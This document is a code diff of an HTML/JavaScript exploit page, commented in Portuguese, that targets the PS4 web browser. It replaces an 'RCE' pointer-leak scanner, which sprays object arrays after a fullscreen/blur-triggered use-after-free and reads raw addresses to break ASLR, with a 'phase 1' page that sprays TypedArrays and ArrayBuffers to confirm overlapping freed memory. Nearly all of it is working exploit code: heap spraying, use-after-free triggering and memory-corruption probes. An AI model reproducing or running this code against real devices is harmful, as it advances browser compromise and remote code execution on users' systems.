@@ -1,128 +1,136 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>PS4 RCE - EXPLOIT 7 v3 (SNIPER MODE)</title>
-    <style>
-        body { background-color: #000; color: #0f0; font-family: monospace; font-size: 16px; padding: 20px; }
-        #log { border: 1px solid #333; padding: 10px; margin-top: 10px; background: #050505; min-height: 400px; }
-        button { width: 100%; padding: 20px; background: #222; color: #0f0; border: 2px solid #0f0; font-weight: bold; font-size: 18px; cursor: pointer; }
-        .success { color: #fff; background: #008800; padding: 10px; border: 2px solid #0f0; animation: flash 1s infinite; }
-        .pointer { color: #00ffff; font-weight: bold; font-size: 1.5em; }
-        @keyframes flash { 50% { opacity: 0.5; } }
-    </style>
+<meta charset="UTF-8">
+<title>UAF Phase-1 Proof — Backing Store</title>
 </head>
 <body>
-
-<h1>EXPLOIT 7 v3: SNIPER MODE</h1>
-<p>Status: Filtro Rígido Ativado. Ignorando Floats (1.0, 2.0...).</p>
-
-<button id="btnRun" onclick="runExploit()">INICIAR CAÇADA FINAL</button>
-<div id="log">Logs...</div>
+<pre id="log"></pre>
+<button onclick="run()">EXECUTAR TESTE FASE 1</button>
 
 <script>
-    const LOG = document.getElementById('log');
-    function log(msg) { LOG.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; }
-    function logHTML(html) { LOG.innerHTML += html; }
+const log = (s) => document.getElementById('log').textContent += s + "\n";
 
-    var controllers = [];
-    var sprayStorage = [];
-    
-    // Objeto alvo. Queremos achar o endereço DESTE objeto.
-    var targetObj = { 
-        marker: 0x1337BEEF, 
-        padding: "ENCHER_MEMORIA_COM_PONTEIROS" 
+// Força pressão de heap para GC
+function forceGC() {
+    let trash = [];
+    for (let i = 0; i < 20000; i++) {
+        trash.push(new ArrayBuffer(0x1000));
+    }
+    trash = null;
+}
+
+// Cria muitos ArrayBuffers com sentinela conhecida
+function sprayBuffers(count, size, sentinel) {
+    const bufs = [];
+    for (let i = 0; i < count; i++) {
+        const ab = new ArrayBuffer(size);
+        const dv = new DataView(ab);
+        dv.setUint32(0, sentinel, true);
+        bufs.push({ ab, dv });
+    }
+    return bufs;
+}
+
+function run() {
+    log("=== FASE 1: PROVA DE UAF REAL (BACKING STORE) ===");
+    log("Prepare-se: aperte OPTIONS quando solicitado.");
+
+    const controllers = [];
+    const PATTERN = 2.121995791e-314;
+
+    // Controladores TypedArray
+    for (let i = 0; i < 6000; i++) {
+        const ta = new Float64Array(8);
+        ta[0] = i;
+        controllers.push(ta);
+    }
+
+    // Fullscreen para gatilhar blur/UAF (mantém sua técnica)
+    const doc = document.documentElement;
+    if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
+
+    window.onblur = function () {
+        log("[*] UAF window aberta.");
+
+        // Spray que costuma ocupar o mesmo slab
+        let spray = [];
+        for (let i = 0; i < 10000; i++) {
+            const t = new Float64Array(10);
+            t.fill(PATTERN);
+            spray.push(t);
+        }
+
+        // Encontrar TypedArray corrompido
+        let corrupted = null;
+        for (let i = 0; i < controllers.length; i++) {
+            if (controllers[i][0] === PATTERN) {
+                corrupted = controllers[i];
+                break;
+            }
+        }
+
+        if (!corrupted) {
+            log("[-] UAF NÃO confirmado.");
+            return;
+        }
+
+        log("[+] UAF CONFIRMADO (TypedArray).");
+
+        // Captura do buffer potencialmente pós-free
+        const buf = corrupted.buffer;
+        const dv = new DataView(buf);
+        log("[*] Capturado corrupted.buffer e DataView.");
+
+        // Escrita inicial local
+        dv.setUint32(0, 0x11111111, true);
+        log("[*] Write local: 0x11111111");
+
+        // Força GC e reuso
+        forceGC();
+        log("[*] GC forçado.");
+
+        // Spray de ArrayBuffers com sentinela distinta
+        const SENTINEL_A = 0x41414141;
+        const SENTINEL_B = 0x42424242;
+        const sprayedA = sprayBuffers(4000, buf.byteLength, SENTINEL_A);
+        const sprayedB = sprayBuffers(4000, buf.byteLength, SENTINEL_B);
+        log("[*] Spray de ArrayBuffers com sentinelas A/B concluído.");
+
+        // Verificação 1: leitura inesperada
+        const r0 = dv.getUint32(0, true);
+        log("[*] Readback pós-GC: 0x" + r0.toString(16));
+
+        if (r0 === SENTINEL_A || r0 === SENTINEL_B) {
+            log("!!! SUCESSO: OVERLAP REAL DETECTADO (sentinela vista no DataView) !!!");
+            return;
+        }
+
+        // Verificação 2: escrita cruzada
+        sprayedA[0].dv.setUint32(0, 0xDEADBEEF, true);
+        const r1 = dv.getUint32(0, true);
+        log("[*] Após escrever em sprayedA[0]: 0x" + r1.toString(16));
+
+        if (r1 === 0xDEADBEEF) {
+            log("!!! SUCESSO: ESCRITA CRUZADA (UAF REAL) !!!");
+            return;
+        }
+
+        // Verificação 3: instabilidade sem escrita
+        forceGC();
+        const r2 = dv.getUint32(0, true);
+        log("[*] Readback após novo GC (sem escrita): 0x" + r2.toString(16));
+
+        if (r2 !== r1) {
+            log("!!! SUCESSO: INSTABILIDADE DE BACKING STORE (pós-free) !!!");
+            return;
+        }
+
+        log("[-] Nenhuma evidência de UAF REAL detectada.");
+        log("[-] Conclusão: backing store ainda válido OU não reaproveitado.");
     };
-
-    function runExploit() {
-        document.getElementById('btnRun').disabled = true;
-        log("1. Alocando Vítimas...");
-        
-        controllers = [];
-        sprayStorage = [];
-
-        // ALOCAÇÃO
-        for(let i=0; i<5000; i++) {
-            let c = new Float64Array(8);
-            c[0] = i + 0.1; // Usamos float para não confundir com inteiros puros
-            c.fill(1.1, 1);
-            controllers.push(c);
-        }
-
-        log("2. Fullscreen... Prepare o OPTIONS.");
-        var el = document.documentElement;
-        if(el.webkitRequestFullscreen) el.webkitRequestFullscreen();
-
-        window.onblur = function() {
-            log(">>> UAF DISPARADO! Spraying Objects...");
-
-            // TÁTICA NOVA: SPRAY MASSIVO DE ARRAYS MISTOS
-            // Arrays mistos [obj, obj] são guardados como ponteiros brutos (Butterflies).
-            try {
-                // Aumentamos a dose para 30.000 para forçar o GC a colaborar
-                for(let k=0; k<30000; k++) {
-                    let s = [targetObj, targetObj, targetObj, targetObj]; 
-                    sprayStorage.push(s);
-                }
-            } catch(e) {}
-
-            log("Spray Massivo concluído. Iniciando Scanner Sniper...");
-            setTimeout(scanForPointers, 300); // Mais tempo para o Heap assentar
-        };
-    }
-
-    function scanForPointers() {
-        let found = false;
-
-        for(let i=0; i<controllers.length; i++) {
-            let victim = controllers[i];
-            
-            try {
-                let dv = new DataView(victim.buffer);
-                
-                // Lemos 2 inteiros de 32 bits (Low e High)
-                let valLow = dv.getUint32(0, true);
-                let valHigh = dv.getUint32(4, true);
-
-                // --- O FILTRO DE OURO ---
-                // Um ponteiro Userland no PS4 tem esta cara: 0x00000008xxxxxxxx
-                // Parte Alta (High): Deve ser PEQUENA (ex: 1, 8, 16, 32).
-                // Se for 0x3ff... ou 0x400... é Float (Lixo).
-                // Se for 0, é Null ou Índice pequeno.
-                
-                // Lógica: 
-                // 1. High deve ser MAIOR que 0.
-                // 2. High deve ser MENOR que 0x00010000 (65536). Nenhum float começa com zeros assim.
-                
-                if (valHigh > 0 && valHigh < 0x00010000) {
-                    
-                    found = true;
-                    let hex = "0x" + valHigh.toString(16).padStart(8,'0') + valLow.toString(16).padStart(8,'0');
-                    
-                    logHTML(`<div class='success'>!!! PONTEIRO VÁLIDO DETECTADO (INDEX ${i}) !!!</div>`);
-                    logHTML(`Endereço: <span class='pointer'>${hex}</span>`);
-                    logHTML("<div>ASLR QUEBRADO.</div>");
-
-                    // Dump para confirmar (devemos ver padrões repetidos se for o nosso spray)
-                    let dump = "Dump parcial:<br>";
-                    for(let off=0; off<32; off+=8) {
-                        let h = dv.getUint32(off+4, true);
-                        let l = dv.getUint32(off, true);
-                        dump += `Off ${off}: 0x${h.toString(16).padStart(8,'0')}${l.toString(16).padStart(8,'0')}<br>`;
-                    }
-                    logHTML(dump);
-                    
-                    logHTML("<br><div style='border:2px solid red; color:white; padding:10px'>TIRE FOTO! ESTE É O ENDEREÇO REAL NA RAM.</div>");
-                    return; 
-                }
-            } catch(e) {}
-        }
-
-        if(!found) {
-            log("Apenas dados originais encontrados. O Spray não alinhou.");
-            log("Dica: Tente rodar novamente. Heap Exploitation é estatístico (tente 5-10x).");
-        }
-    }
+}
 </script>
 </body>
 </html>
+
